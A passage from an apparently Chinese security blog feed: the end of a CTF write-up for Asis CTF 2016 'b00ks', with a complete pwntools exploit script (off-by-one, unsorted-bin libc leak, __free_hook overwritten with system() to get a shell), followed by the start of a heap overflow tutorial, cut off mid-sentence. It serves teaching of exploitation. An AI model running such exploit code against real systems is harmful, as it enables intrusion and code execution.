基地址存在固定的偏移，根据这个固定偏移来计算 libc 基地址</p><p><em>另一种方法就是利用 <code>unsorted bin</code> 的特点来泄露 libc 基地址</em></p><blockquote><p>因为 <code>unsorted bin</code> 是双向链表，所以第一个 <code>unsorted bin</code> 的 <code>bk</code> 也就指向了 <code>bin[1]</code></p><p><strong>如果我们能够打印出第一个 <code>unsorted bin</code> 的 <code>bk</code>，也就相当于得到了 <code>bins[1]</code> 地址，而 <code>bins[1]</code> 在 libc 中，也就可以根据偏移计算 libc 基地址</strong></p></blockquote><p>而关键在于：得到一个 <code>unsorted bin</code> </p><p>我们知道，当 <code>free</code> 的 <code>chunk</code> 大小 &gt;&#x3D; 144 字节时，<code>chunk</code> 会放到 <code>unsorted bin</code> 中</p><p>因此，我们需要先创建第二本书，使其 <code>chunk</code> 的大小在 <code>free</code> 的时候大于 144 字节，这本书在后面是需要被 <code>free</code> 形成 <code>unsorted bin</code> 的，所以我们再创建第三本书，写入 <code>&#39;/bin/sh&#39;</code></p><p>创建三本书后如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks30.png" alt="【Asis CTF 2016】b00ks30.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks28.png" alt="【Asis CTF 2016】b00ks28.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks29.png" alt="【Asis CTF 2016】b00ks29.png"></p><p>接着还是通过 <code>Edit()</code> 功能伪造一个 <code>book[0]</code></p><ul><li><p>这次伪造的 <code>book[0] -&gt; name</code> 指向即将 <code>free</code> 后形成的 <code>unsorted bin</code> 的 <code>bk</code> 地址（<strong>注意：图中和脚本中实际指向的是 <code>fd</code> 地址，但由于这里只存在一个 unsorted bin，因此 <code>fd</code> 与 <code>bk</code> 指向同一地址，故不影响</strong>）</p></li><li><p>为了便于劫持 <code>__free_hook</code> 为 <code>system()</code>，我们将伪造的 <code>book[0] -&gt; description</code> 指向 <code>book[2]</code> 的 <code>description</code></p><p>  这样我们通过 <code>Edit(1, p64(free_hook_addr) + p64(0x10))</code> 修改 <code>book[0]</code> 的 <code>description</code> 的时候，就可以将 <code>book[2] -&gt; description</code> 修改为 <code>__free_hook</code></p><p>  然后再通过 <code>Edit(3, p64(system_addr))</code> 修改 <code>book[2]</code> 的 <code>description</code> 的时候，就可以将 <code>__free_hook</code> 修改为 <code>system()</code></p></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks31.png" alt="【Asis CTF 2016】b00ks31.png"></p><p>伪造好 <code>book[0]</code> 后，通过 <code>Change()</code> 功能填充 0x20 字节，溢出 1 字节 <code>&#39;\x00&#39;</code> 覆盖 <code>book[0]</code> 指针的最低位，使其指向我们伪造的 <code>book[0]</code></p><p>然后 <code>free</code> 掉 <code>book[1]</code> 后形成 <code>unsorted bin</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks32.png" alt="【Asis CTF 2016】b00ks32.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks33.png" alt="【Asis CTF 2016】b00ks33.png"></p><p>可以看到 <code>bk</code> 和 <code>fd</code> 指向的是同一个地址，打印其中之一即可</p><p>通过 <code>Print()</code> 功能在 <code>Name</code> 处打印出了 <code>fd</code>、<code>bk</code> 指针</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks34.png" alt="【Asis CTF 2016】b00ks34.png"></p><p>通过 GDB 可以看到 <code>fd</code>、<code>bk</code> 指针指向的地址为 <code>main_arena + 88</code> 处</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks35.png" alt="【Asis CTF 2016】b00ks35.png"></p><p>同时 <code>main_arena</code> 与 <code>__malloc_hook</code> 相距 0x10</p><p>因此根据偏移可以获得 <code>__malloc_hook</code> 的真实地址，而 <code>__malloc_hook</code> 是 libc 中的函数，根据 libc 偏移即可获得 libc 基地址</p><p>最后，利用前面提到的两次 <code>Edit()</code> 劫持 <code>__free_hook</code> 为 <code>system()</code></p><ol><li>第一次 <code>Edit()</code> 将 <code>book[2] -&gt; description</code> 修改为 <code>__free_hook</code>：</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks36.png" alt="【Asis CTF 2016】b00ks36.png"></p><ol start="2"><li>第二次 <code>Edit()</code> 将 <code>__free_hook</code> 修改为 <code>system()</code>：</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks37.png" alt="【Asis CTF 2016】b00ks37.png"></p><p>然后通过 <code>Delete()</code> 调用 <code>free</code> 执行 <code>system(/bin/sh)</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks38.png" alt="【Asis CTF 2016】b00ks38.png"></p><hr><h1 id="脚本二"><a href="#脚本二" class="headerlink" title="脚本二"></a>脚本二</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./b00ks"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./b00ks"</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Create</span><span class="token punctuation">(</span>name_size<span class="token punctuation">,</span> name<span class="token punctuation">,</span> des_size<span class="token punctuation">,</span> des<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>des_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>des<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Delete</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Edit</span><span class="token punctuation">(</span>book_id<span class="token punctuation">,</span> new_des<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>new_des<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Change</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Enter author name: '</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>Create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'bbbb'</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'cccc'</span><span class="token punctuation">)</span>Print<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>book1_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'book1_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book1_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>book2_addr <span class="token operator">=</span> book1_addr <span class="token operator">+</span> <span class="token number">0x30</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'book2_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book2_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>Create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">b'cccc'</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'dddd'</span><span class="token punctuation">)</span>   <span class="token comment"># 为 unsorted bin 做准备</span>Create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'ffff'</span><span class="token punctuation">)</span>   <span class="token comment"># 存放 '/bin/sh'</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>book2_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>book2_addr <span class="token operator">+</span> <span class="token number">0x160</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>   <span class="token comment"># 伪造 book[0]</span>Change<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>   <span class="token comment"># 覆盖 book[0] 的最低位，改变其指向的地址为伪造的 book[0]</span>Delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>   <span class="token comment"># 形成 unsorted bin</span>Print<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment"># 泄露 unsorted bin 的 bk 指针</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name: '</span><span class="token punctuation">)</span>main_arena_88 <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>main_arena_addr <span class="token operator">=</span> main_arena_88 <span class="token operator">-</span> <span class="token number">88</span>malloc_hook_addr <span class="token operator">=</span> main_arena_addr <span class="token operator">-</span> <span class="token number">0x10</span>   <span class="token comment"># 根据偏移得到 __malloc_hook 真实地址</span>libc_base <span class="token operator">=</span> malloc_hook_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>   <span class="token comment"># 得到 libc 基地址</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'main_arena_88 -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_arena_88<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'main_arena_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_arena_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'malloc_hook_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>free_hook_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>one_gadget_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4527a</span>   <span class="token comment"># 0x45226 0x4527a 0xf03a4 0xf1247</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'bin_sh_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'one_gadget_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 将 book3 -> description 修改为 __free_hook</span>Edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 将 __free_hook 修改为 system()</span><span class="token comment"># Edit(3, p64(one_gadget_addr))   # system(/bin/sh) 与 one_gadget 选其一即可</span>Delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果二"><a href="#结果二" class="headerlink" title="结果二"></a>结果二</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks39.png" alt="【Asis CTF 2016】b00ks39.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆相关漏洞与利用</title>
      <link href="/posts/baa7ab63.html"/>
      <url>/posts/baa7ab63.html</url>
      
        <content type="html"><![CDATA[<h1 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h1><blockquote><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数 <mark>（注意：是写入的字节数超过了堆块本身可使用的字节数，而不是用户申请的字节数，因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数）</mark>，并覆盖到<strong>物理相邻的高地址</strong>的下一个堆块，轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程</p><p>一般来说，堆溢出漏洞需要两个前提：</p><ol><li><strong>程序向堆上写入数据</strong></li><li><strong>写入的数据大小没有被良好地控制</strong></li></ol><p>参考文章：</p><ol><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heapoverflow-basic/">堆溢出 - CTF Wiki</a></li></ol></blockquote><p><em>与栈溢出不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此堆溢出通常无法像栈溢出一样直接控制 EIP</em></p><p>一般来说，我们利用堆溢出的策略是：</p><ol><li><p>覆盖与其<strong>物理相邻的下一个 <code>chunk</code></strong> 的内容</p><ul><li><code>prev_size</code></li><li><code>size</code>，主要有三个比特位，以及该堆块真正的大小<ul><li><code>NON_MAIN_ARENA</code></li><li><code>IS_MAPPED</code></li><li><code>PREV_INUSE</code></li><li><code>the True chunk size</code></li></ul></li><li><code>chunk content</code>，从而改变程序固有的执行流</li></ul></li><li><p>利用堆中的机制（如 <code>unlink</code> 等 ）来实现任意地址写入或控制堆块中的内容等效果，从而来控制程序的执行流</p></li></ol><blockquote><p>堆溢出通常需要配合其他的方法来实现漏洞的利用，比较常用的方法有：Chunk Extend and Overlap 等</p></blockquote><hr><h2 id="关键步骤"><a href="#关键步骤" class="headerlink" title="关键步骤"></a>关键步骤</h2><h3 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h3><blockquote><p>通常来说堆是通过调用 Glibc 函数 <code>malloc</code> 进行分配的，在某些情况下会使用 <code>calloc</code> 分配，<code>realloc</code> 同样也可以达到类似的效果</p><p>因此，常用的堆分配函数有：</p><ol><li><code>malloc</code></li><li><code>calloc</code></li><li><code>realloc</code></li></ol></blockquote><p><code>calloc</code> 与 <code>malloc</code> 的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 等价于</span>ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><blockquote><p>通过寻找危险函数，可以快速确定程序是否可能存在堆溢出漏洞</p></blockquote><p>常见的危险函数如下</p><ul><li><p>输入</p><ul><li>gets，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li><li>scanf</li><li>vscanf</li></ul></li><li><p>输出</p><ul><li>sprintf</li></ul></li><li><p>字符串</p><ul><li>strcpy，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>strcat，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li><li>bcopy</li></ul></li></ul><hr><h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><blockquote><p>这一部分主要是计算我们开始写入的地址与我们所要覆盖的地址之间的距离</p></blockquote><p>主要有以下几点需要重点注意：</p><ul><li><em><code>malloc</code> 的参数并不等于实际分配堆块的大小</em></li></ul><p><strong><code>ptmalloc2</code> 分配出来的大小是对齐的，这个长度一般是字长的 2 倍</strong>。比如 32 位系统是 8 字节，64 位系统是 16 字节</p><p>因此，<strong>对于不大于 2 倍字长的请求，<code>malloc</code> 会直接返回 2 倍字长的块（也就是最小 <code>chunk</code>）</strong>，比如 64 位系统执行 <code>malloc(0)</code> 会返回用户区域为 16 字节的块</p><ul><li><em>用户区域的大小不等于 <code>chunk_head.size</code></em></li></ul><pre class="line-numbers language-text" data-language="text"><code class="language-text">chunk_head.size = 用户区域大小 + 2 * 字长<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>用户申请的内存大小会被修改，有可能会使用与其物理相邻的下一个 <code>chunk</code> 的 <code>prev_size</code> 字段来储存内容</li></ul><p>例如：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>chunk<span class="token punctuation">;</span>  chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上述代码中，申请的 <code>chunk</code> 大小是 24 字节</p><p>但是将其编译为 64 位可执行程序时，实际上分配的内存会是 16 字节而不是 24 字节</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">//根据系统的位数，malloc 会分配 8 或 16 字节的用户空间</span><span class="token number">0x602000</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000000021</span><span class="token number">0x602010</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000000000</span><span class="token number">0x602020</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000020fe1</span><span class="token number">0x602030</span><span class="token operator">:</span>   <span class="token number">0x0000000000000000</span>  <span class="token number">0x0000000000000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>16 字节的空间是如何装得下 24 个字节的内容呢？答案是借用了下一个块的 <code>pre_size</code> 域</p><p>用户申请的内存大小与 Glibc 中实际分配的内存大小之间的转换如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* pad request bytes into a usable size -- internal version */</span><span class="token comment">// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">request2size</span><span class="token expression"><span class="token punctuation">(</span>req<span class="token punctuation">)</span>                                                      </span><span class="token punctuation">\</span>    <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">+</span> SIZE_SZ <span class="token operator">+</span> MALLOC_ALIGN_MASK <span class="token operator">&lt;</span> MINSIZE<span class="token punctuation">)</span>                           </span><span class="token punctuation">\</span>         <span class="token expression"><span class="token operator">?</span> MINSIZE                                                             </span><span class="token punctuation">\</span>         <span class="token expression"><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token operator">+</span> SIZE_SZ <span class="token operator">+</span> MALLOC_ALIGN_MASK<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span>MALLOC_ALIGN_MASK<span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当 <code>req = 24</code> 时，<code>request2size(24) = 32</code></p><p>除去 <code>chunk</code> 头部的 16 字节，实际上用户可用 <code>chunk</code> 为 16 字节，而 <code>chunk</code> 的 <code>pre_size</code> 仅当它的前一块处于释放状态时才起作用，所以用户这时候其实还可以使用下一个 <code>chunk</code> 的 <code>prev_size</code> 字段，正好 24 个字节</p><blockquote><p>实际上 <code>ptmalloc2</code> 分配内存是以双字为基本单位</p><p>以 